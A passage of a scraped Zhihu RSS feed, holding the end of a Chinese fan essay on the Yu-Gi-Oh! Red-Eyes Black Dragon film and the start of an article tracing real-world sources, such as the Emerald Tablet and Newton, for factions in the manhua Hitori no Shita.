data-watermark-src=\"v2-7e95c21c2ad1b87c950d6c5929fdd79b\" data-private-watermark-src=\"v2-1b1e840921f30bb326168e8fcedf9b77\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2b322c8386b0d2eff778f4942d6441d6_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2b322c8386b0d2eff778f4942d6441d6\" data-watermark-src=\"v2-0ced17d36be6d827f7e7a455ad1fec7b\" data-private-watermark-src=\"v2-b4989c7581ed4411ffcdf274ac9cec72\"></p>\n<p>卡店老板说明，这是和青眼白龙齐名的顶级稀有卡。显然出于大家可以理解的历史的局限性，她无法预知20多年后青眼白龙的身价上升到了8700万人民币。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-35ddc28e9c24d2d52508890794576a0b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35ddc28e9c24d2d52508890794576a0b\" data-watermark-src=\"v2-36d122f19e98b7863bfa11de921e8a7f\" data-private-watermark-src=\"v2-af10254c06f07702884d31adf7d82c7a\"></p>\n<p>得到了真红眼黑龙的翔吾自然把欺负他的大孩子吓了一跳。但他从未用真红眼黑龙决斗过。只是出示这张卡证明自己已经不会输给任何人了。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c1f13d661b84c5c27776a716a9fbaf80_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1f13d661b84c5c27776a716a9fbaf80\" data-watermark-src=\"v2-68c8cda4d377f033a5c8d243935a46a4\" data-private-watermark-src=\"v2-76acaa397785974c8aa53056cf49795d\"></p>\n<p>长期监视着童实野各大卡店的海马知道了这件事。他举办了一场赌上稀有卡的邀请赛，一方面想弄到翔吾手上的真红眼，另一方面也是为了击败游戏。</p>\n<p>中途，游戏和城之内在去参加过程中撞见海马的保镖，他抢走翔吾的真红眼并和游戏、城之内产生肢体摩擦。最后城之内帮翔吾夺回了真红眼，并将其加入到游戏卡组中去对战海马。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d85dd3a03015e9265ada754b38ed851d_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d85dd3a03015e9265ada754b38ed851d\" data-watermark-src=\"v2-04de5df3093bf8e6ff4469f9e86b52b1\" data-private-watermark-src=\"v2-13a39ecd27d896cd792b165d8ee82cf6\"></p>\n<p>王样和海马的对战使用的是王国篇里海马展示过的圆形决斗盘。决斗过程主要复刻自王国篇王样对阵傀儡师的流程，用黑魔术师+魔术礼帽+六芒星的咒缚的组合击破一只青眼白龙。</p>\n<p><br></p>\n<p>之后海马死者苏生出青眼白龙，并发动邪恶锁链，将三只青眼白龙结合到一起。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-40ccda1eb2fc9cbf42312cd0ad76c0f4_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-40ccda1eb2fc9cbf42312cd0ad76c0f4\" data-watermark-src=\"v2-857f98cfd7af410f95aedefb4f5f818b\" data-private-watermark-src=\"v2-6e7183e44da4ea3a262ea0cdc45cfabf\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-accea74dc4a582328b7bc200441c3e09_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-accea74dc4a582328b7bc200441c3e09\" data-watermark-src=\"v2-22982e0c9aa3112eaf83d64418eace05\" data-private-watermark-src=\"v2-d789760ce392bdd811d83b8e72aa4bdb\"></p>\n<p>这不是融合，所以这样结合出来的也并不是青眼究极龙。它的正式名字叫“青眼の白竜３体連結”。ZZ玩家可能对这张卡有印象，但要说它是纯粹的ZZ自创的假卡还真有点冤枉它了。这张卡是来自于游戏王的版权还属于万代的时期，由万代出品的卡片。ZZ卡的卡图也是原封不动照搬的这个。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-120044f5bde94ce65f122d5ebd5f863b_720w.jpg?rss\" data-rawwidth=\"368\" data-rawheight=\"366\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-120044f5bde94ce65f122d5ebd5f863b\" data-watermark-src=\"v2-48eefe6524ad3d1cd1571dcbaa84beed\" data-private-watermark-src=\"v2-4a5fa0cd1cfdf5e23d9569e1f900bab2\"></p>\n<p>说回正题。面对强大的三只青眼白龙，此时王样唯一的胜机就在真红眼身上了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4be5dea37562bae0f42a121ee212aa48_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4be5dea37562bae0f42a121ee212aa48\" data-watermark-src=\"v2-b0f3c1440fe26fd1f89922f6437b9160\" data-private-watermark-src=\"v2-4a70ab516e498a559ff4997bdf6da267\"></p>\n<p>翔吾见王样赢不了，习惯性的想逃避。城之内拉住他，让他坚持下去。真红眼是他的卡，王样使用真红眼需要他的斗志。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7cf29ac0bdbc0b54324d25d6215cdc59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7cf29ac0bdbc0b54324d25d6215cdc59\" data-watermark-src=\"v2-1b39801a3b3ea5e46a061b0f243ed800\" data-private-watermark-src=\"v2-9feb7cd3a596ccb938d53d414a37cf73\"></p>\n<p>翔吾拥有真红眼过后依然不敢和人决斗。他惧怕自己有了真红眼后依然打不过别人，那样会更加“站不起来”。城之内让他不要再抱着卡片做梦。既然是决斗者，就要敢于面对战斗，敢于面对自己。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c1b54038425e66aefc7abc56b31edd72_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1b54038425e66aefc7abc56b31edd72\" data-watermark-src=\"v2-49f42251f923c6168dcb58ecfab985c2\" data-private-watermark-src=\"v2-8e33b80dde93ac942f2589d3d0a954ee\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e21eba2bfa439eb94254d30bdfbb206c_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e21eba2bfa439eb94254d30bdfbb206c\" data-watermark-src=\"v2-a9766a26c9952e9f63ccccb31e0f39c0\" data-private-watermark-src=\"v2-edfcf1a96d6163a6518ba48a3dedf460\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-300c32bd0ebf2424d72757004c30d78b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-300c32bd0ebf2424d72757004c30d78b\" data-watermark-src=\"v2-a57ffe72cba93f1e92467fb13548b591\" data-private-watermark-src=\"v2-356bd45eb67ec616cd0d7e7c514e1dda\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9a5198ca905345febe360d7f8abaf431_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a5198ca905345febe360d7f8abaf431\" data-watermark-src=\"v2-6218f9d0dc4a74ae5a5f4d24fcd3f777\" data-private-watermark-src=\"v2-b77920fd51f3705ba782613908c5539c\"></p>\n<p>这里开始切入主题了。真正的决斗者不是靠稀有卡，而是靠自身的斗志，和相信胜利的可能性。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f48477eb153f2137d5a6ca88ddde7299_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f48477eb153f2137d5a6ca88ddde7299\" data-watermark-src=\"v2-1924854fa64cd296123530d8925e2dbf\" data-private-watermark-src=\"v2-2dda31921ba894894426baa75313fed8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-01b60dea8154a8ae06e08572e36ba52e_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-01b60dea8154a8ae06e08572e36ba52e\" data-watermark-src=\"v2-b4c937bc9be531ff0cac1a737678e7fc\" data-private-watermark-src=\"v2-11649c36d8f534676845ea98862b7108\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3dca4ecafcff91cecf94f07e412e75f5_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3dca4ecafcff91cecf94f07e412e75f5\" data-watermark-src=\"v2-807892f8679fedb0eee7f733bc000478\" data-private-watermark-src=\"v2-6a490e4a309b5ce61801ef11bef132f3\"></p>\n<p>这段台词是整部《真红眼黑龙》的核心。“可能性”既是黑龙带来的，也是决斗者带来的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b199dba4d6b81b6b7c2a2cfd918f6d10_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b199dba4d6b81b6b7c2a2cfd918f6d10\" data-watermark-src=\"v2-aafc58514796dc2f65841d4667f0dad6\" data-private-watermark-src=\"v2-49f7db76007d200e0cb58fdc6426f4cb\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-12f0f67e06b7f4d0b961cfd9ffff3e99_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-12f0f67e06b7f4d0b961cfd9ffff3e99\" data-watermark-src=\"v2-76b4103dc057562909ebda916f22d3c6\" data-private-watermark-src=\"v2-3f264c847c31584ebedd1eef63e8b049\"></p>\n<p>顿悟的翔吾鼓起勇气并传达给王样。王样终于召唤出真红眼黑龙。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c7a5c7b45ce9cd8ca46e78bdffcbab51_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c7a5c7b45ce9cd8ca46e78bdffcbab51\" data-watermark-src=\"v2-6fb212ffaa8a00d8033e28306c3dbfdc\" data-private-watermark-src=\"v2-061acdd03e59ab0fa514f14d58401a45\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b75e5b2375bcc62beed90c69dc3b4998_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b75e5b2375bcc62beed90c69dc3b4998\" data-watermark-src=\"v2-1544740aea36eda0567606cf46800e4c\" data-private-watermark-src=\"v2-0848dd652d92c968435a2fb1445d4c1f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d444634dfbc07b76e4593d8560521d59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d444634dfbc07b76e4593d8560521d59\" data-watermark-src=\"v2-a3cd9ccc3a20ae738c5f98ff4da32a53\" data-private-watermark-src=\"v2-bc434c67a1bd6b931e26dd1c76b50638\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2599b082deb8ac5c855410a767f939e3_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2599b082deb8ac5c855410a767f939e3\" data-watermark-src=\"v2-ce75647a7cfef51e565f41b8a7d4fceb\" data-private-watermark-src=\"v2-46058fba60dd940bd3c3bb0fa53cb3dc\"></p>\n<p>出场时的气势还是很赞的。但是……</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-28b4a3f22eaa96d16e3dd2f0461b1f78_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-28b4a3f22eaa96d16e3dd2f0461b1f78\" data-watermark-src=\"v2-9663b0345331ed36d4e6ab0916639634\" data-private-watermark-src=\"v2-baa6ad6a253eb57061de3aac6d00549e\"></p>\n<p>马上就被拿来融合了。</p>\n<p><br></p>\n<p>真红眼和王样场上的流星龙融合，成了流星黑龙。没错，不仅流星黑龙其实是王样用出来的，流星龙也是。不动游星是谁？不太熟啊。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-21644bdec8494533f4d5ca74c849e9e1_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21644bdec8494533f4d5ca74c849e9e1\" data-watermark-src=\"v2-1be39fc4c49833734b715f95a4d9c401\" data-private-watermark-src=\"v2-a03461db1e2d7ad27582fc2c57f79768\"></p>\n<p>流星黑龙击败青眼白龙3体连接，打败海马。从这场战斗中得到勇气的翔吾也能正常的打牌了。以前欺负他的大孩子也成为了朋友。故事结束。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a731ad00351e78791660f0fd831af552_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a731ad00351e78791660f0fd831af552\" data-watermark-src=\"v2-668313755bd6f67fffc47bf8d7a4d8ac\" data-private-watermark-src=\"v2-8d47c374e0ceaa9164b723b08b20da27\"></p>\n<p><br></p>\n<p><br></p>\n<p>这个剧场版除了赋予“白龙带来胜利，黑龙带来可能性”这个象征意义外，还通过这个故事把真红眼与决斗者的斗志绑在了一起。当然，这是因为原作剧情后来真红眼成了城之内的卡。对于城之内这么一个从区大赛8强起步，一步步打成决斗城市准决赛的底层励志角色来说，斗志、可能性，形容的既是真红眼，也是城之内本人。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-19e3732cb72fd604fd3360ffd54d24a4_720w.jpg?rss\" data-rawwidth=\"417\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-19e3732cb72fd604fd3360ffd54d24a4\" data-watermark-src=\"v2-5f4749a46372bb0705dfdce610b9e6de\" data-private-watermark-src=\"v2-0ee58a90d087c32beab8034cea7ce063\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bab92ffcdfde35c55ab16b9fca0b453a_720w.jpg?rss\" data-rawwidth=\"1982\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bab92ffcdfde35c55ab16b9fca0b453a\" data-watermark-src=\"v2-d9431e0a6137d2f3de9c7c71a95f21d2\" data-private-watermark-src=\"v2-780680b647173086b1f2d480a43b518d\"></p>\n<p>在决斗城市开幕期间，城之内认为自己实力还配不上使用真红眼，将其交给了王样保管，由此这张卡也成为了代表2人羁绊的卡。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4727bd92b988637efd4eb30e7b7a4c2a_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4727bd92b988637efd4eb30e7b7a4c2a\" data-watermark-src=\"v2-9125de54350c74c73eee1fd89e77cf0c\" data-private-watermark-src=\"v2-4f754c590e77042ff779f51d39208a98\"></p>\n<p>城之内被马利克洗脑进行的码头决斗时，表君用手札对换来尝试唤醒城之内。城之内残存的意识还记得自己的承诺，一定要到自己能成为独当一面的决斗者时，才能取回真红眼。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4bcd781376eec0f31f1556429e134f78_720w.jpg?rss\" data-rawwidth=\"2034\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4bcd781376eec0f31f1556429e134f78\" data-watermark-src=\"v2-f113a8cd8a74bd65dfda830b4a87d453\" data-private-watermark-src=\"v2-6e835710a90c7b1ecfbba4a5df64f23a\"></p>\n<p>这段剧情让真红眼成了2人羁绊的见证。并在之后的决斗城市准决赛上，真红眼在场上提升超魔导剑士攻击力，帮助王样战胜海马。</p>\n<p>小tips：其实在游戏王原作里，真红眼在王样手上的戏份比在城之内那还多些。因为整个决斗城市篇它都在王样卡组里，而决斗城市篇之后城之内也没有再决斗过了。</p>\n<p><br></p>\n<p>综上所述，一开始，真红眼黑龙这张卡的意义只是在剧情设定上的超高地位，但后续无论原作剧情还是动画原创的剧场版剧情，都在为其增添它的象征意义。到如今留在我们记忆里的真红眼黑龙，它就如同景山东坡的老歪脖子树，所携带的那些故事就已经让它充满了历史价值，本身故事设定的稀有度什么的反而不重要了。如同《真红眼黑龙》中所描绘的，卡片再稀有、再强大，终究只是卡片。决斗者最强大的武器，是自己的心。</p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ai-xie-71-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">艾叶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">38 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431039255?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问有类似心灵崩坏的游戏王卡片推荐一下吗？</a><br><a href=\"http://www.zhihu.com/question/444088245?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏王对战中，卡片不会成为卡片效果对象和不会被魔法陷阱怪兽效果影响这两个描述本质上有什么不同吗？</a><br>\n","link":"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》第533（566）话？","date":"2021-07-02 11:30:09","description":"\n<p>漫画533（566）话出现了许多新势力，从个人而言是开心的，这说明一人的格局并没有被完全被甲申之乱和三十六贼束缚；时至今日还在开辟新的世界；人外有人，天外有天；这才更像一个真实的世界；所以这里从个人角度来尝试着寻找一下这些世界势力的原型；</p>\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《一人之下》漫画和手游为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i><br><i>2，文中涉及的历史，符文以及各门派的简介，都是仅在一人之下世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> <br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-55d320a66f7bb4ee4ebcf362c60e66ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-55d320a66f7bb4ee4ebcf362c60e66ae\" data-watermark-src=\"v2-d269b95f035e43ad2174831b9c493427\" data-private-watermark-src=\"v2-43a44f8c14b7d89ab162d7f7e5f088d1\"></p>\n<p><i>如果有时间也可以先看之前做的漫画 </i>531（565）话之前世界异人的总结；</p>\n<a href=\"https://zhuanlan.zhihu.com/p/381719463\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-b68b2071ca06cb01c14181e72308f3b9_720w.jpg\" data-entity-type=\"article\" data-entity-data=\"null\" class=\"internal\">【一人之下】——世界异人汇总(截止漫画531话）</a><h2>目录</h2>\n<p><b>引子</b></p>\n<p><b>翡翠学会</b></p>\n<p>1.翠玉录</p>\n<p>2.牛顿</p>\n<p>3.斯宾塞</p>\n<p><b>大地之子</b></p>\n<p>1.盖亚</p>\n<p>2.那罗伽</p>\n<p>3.地母神</p>\n<p><b>异人馆</b></p>\n<p>1.九属会馆</p>\n<p>2.查侬</p>\n<p><b>石川流</b></p>\n<p>1.石川家</p>\n<p>2.妖刀蛭丸</p>\n<p><b>贝希摩斯</b></p>\n<p>1.贝希摩斯</p>\n<p>2.工业法器</p>\n<p>3.美国工会</p>\n<p><b>纳森岛</b></p>\n<p>1.阿方索</p>\n<p>2.纳森王</p>\n<p>3.投石问路</p>\n<p><b>个人想法</b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2>引子</h2>\n<p>漫画533（566）话出现了许多新势力，我们知道在中国有哪都通管理全国异人，那世界的其他地方，是什么样的组织在管理各方异人呢？虽然现在我们只了解到他们的名字，但是其实其中的许多名字都可以在现实世界中的世界传说和各国组织中找到一定的相似之处；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99d1b90fef8afc45e57917b59929553d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"182\" data-watermark=\"watermark\" data-original-src=\"v2-99d1b90fef8afc45e57917b59929553d\" data-watermark-src=\"v2-2d79ff4b65d21566f78d5d279f663661\" data-private-watermark-src=\"\"></p>\n<h2><b>翡翠学会</b></h2>\n<p><b>1.翠玉录</b></p>\n<p>不出意外的话，这个翡翠学会的来源应该就是源自传说中的《翠玉录》；（overlord中雅儿贝德三姐妹的制作者的ID也是借鉴了这一原型。）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-822c348e1572cea26cd15e67a6bc5b8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-822c348e1572cea26cd15e67a6bc5b8a\" data-watermark-src=\"v2-ef5958deabdd11be483090a355c70ed4\" data-private-watermark-src=\"\"></p>\n<p>那么为什么《翠玉录》在西方那么有名呢？传说西方炼金术起源自埃及。公元前1900年。埃及法老赫耳墨斯以及他传说中的父亲透特神以及赫尔墨斯的大儿子大祭祀塔特三代神明将所有炼金术的知识浓缩为13句话，雕刻在一块翠绿的祖母绿宝石板上，流传于人世。因此《翠玉录》也被称为翠玉十三章，这篇文字被认为是西方炼金术的源头和鼻祖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d70b9fe6f8ba8551e8972003a3120f9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"183\" data-watermark=\"watermark\" data-original-src=\"v2-7d70b9fe6f8ba8551e8972003a3120f9\" data-watermark-src=\"v2-522f2a0565a50e43b93f8cca1a50e891\" data-private-watermark-src=\"\"></p>\n<p>那么这《翠玉录》中究竟说了什么呢？这里列出一下这十三句话；「内容来源网络侵删」</p>\n<blockquote>作者：艾萨克·牛顿 名称：《翠玉录》 链接：<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%25BF%25A0%25E7%258E%2589%25E5%25BD%2595/4579712%3Ffr%3Daladdin\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">翠玉录（词语）_百度百科</a>\n</blockquote>\n<p>1. 真实不虚，永不说谎，必然带来真实： Tis true without lying, certain &amp; most true:</p>\n<p>2.下如同上，上如同下；依此成全太一的奇迹。 That which is below is like that which is above and that which is above is like that which is below to do ye miracles of one only thing.</p>\n<p><img src=\"https://pic1.zhimg.com/v2-58b8d6304a790d20bbf27e8168c4f82c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1368\" data-rawheight=\"291\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>3.万物本是太一，借由分化从太一创造出来。 And as all things have been and arose from one by ye mediation of one: so all things have their birth from this one thing by adaptation.</p>\n<p>4.太阳为父，月亮为母，从风孕育，从地养护。 The Sun is its father, the moon its mother, the wind hath carried it in its belly, the earth its nourse.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f8b961b14317862800cf5c969ef445f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1376\" data-rawheight=\"307\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>5.世间一切完美之源就在此处；其能力在地上最为完全。 The father of all perfection in ye whole world is here. Its force or power is entire if it be converted into earth.</p>\n<p>6.分土于火，萃精于糙，谨慎行之。 Separate thou ye earth from ye fire, ye subtile from the gross sweetly wth great indoustry.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-452e645e879f66f710d2de25786324fe_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1369\" data-rawheight=\"340\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>7.从地升天，又从天而降，获得其上、其下之能力。 It ascends from ye earth to ye heaven &amp; again it desends to ye earth and receives ye force of things superior &amp; inferior.</p>\n<p>8.如此可得世界的荣耀、远离黑暗蒙昧。 By this means you shall have ye glory of ye whole world &amp; thereby all obscurity shall fly from you.</p>\n<p>9.此为万力之力，摧坚拔韧。 Its force is above all force, for it vanquishes every subtile thing &amp; penetrates every solid thing.</p>\n<p><img src=\"https://pic1.zhimg.com/v2-deed0e5111f61fb75f7db2ad64c35be6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1382\" data-rawheight=\"414\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>10.世界即如此创造。 So was ye world created.</p>\n<p>11.依此可达奇迹。 From this are &amp; do come admirable adaptations whereof ye process is here in this.</p>\n<p>12.我被称为三重伟大的赫尔墨斯，因我拥有世界三部分的智慧。 Hence I am called Hermes Trismegist, having the three parts of ye philosophy of ye whole world.</p>\n<p>13.这就是我所说的伟大工作。 That which I have said of ye operation of ye Sun is accomplished &amp; ended.</p>\n<p>以上就是英文版与中文版的《翠玉录》了（原文是拉丁文的），炼金术士认为太阳指的是不朽的精神，月亮指的是低层次的自我，是高我的投影。风是指灵性的生命力，地是指物质的躯体。炼金就是指神性与躯体的联合、精神和物质的统一；（信息来源于网络）如果这个解读角度合理的话，那这一点从和中国修炼中的性命双修其实也是异曲同工的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1b78b5442e9ce51713fb675f6d84b8bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"191\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>2.牛顿</b></p>\n<p>在研究和解读《翠玉录》的人中，最有名的要数著名科学家艾萨克·牛顿了；传说上文引用的英文翻译就是他所做的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be2e55e5fa3b416ae8ffa60b286cc9ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"779\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-be2e55e5fa3b416ae8ffa60b286cc9ab\" data-watermark-src=\"v2-0b368f26cc81c6f38cfbf827c85aecf4\" data-private-watermark-src=\"\"></p>\n<p>这位站立在巫术终结和科学兴起的历史转折点上的天才，通过对未知世界永无止境的探索，使他成为有史以来最伟大的科学家之一，也使他将自己一生中更多的精力花费在炼金术上，牛顿总共留下50多万英文单词的炼金术手稿和100多万单词的神学手稿，而这些工作与他的科学发现很难说是毫无关联的。值得注意的是塔伯院长与牛顿同名也叫艾萨克；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-379fbcbf8f9950c6140295ba763d09a6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-379fbcbf8f9950c6140295ba763d09a6\" data-watermark-src=\"v2-24464dcdf2abdfc37df1bbbfe2e0bf06\" data-private-watermark-src=\"\"></p>\n<p>从之前的怀念画面也可以看出，弗拉梅尔学院和塔伯院长可能也曾隶属于欧洲翡翠学会；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-914b18a24c49ce0865032affa1e92e20_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"190\" data-watermark=\"watermark\" data-original-src=\"v2-914b18a24c49ce0865032affa1e92e20\" data-watermark-src=\"v2-c89b8b37d6217141e65e3d4b56e6b6bc\" data-private-watermark-src=\"\"></p>\n<p><b>3.斯宾塞</b></p>\n<p>这位欧洲翡翠学会的理事叫做威廉斯宾塞；威廉是一个非常常见的西方名字；而历史上也有一位比较著名的斯宾塞；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bef177f905feaa58d87b0df1ce44032f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"159\" data-watermark=\"watermark\" 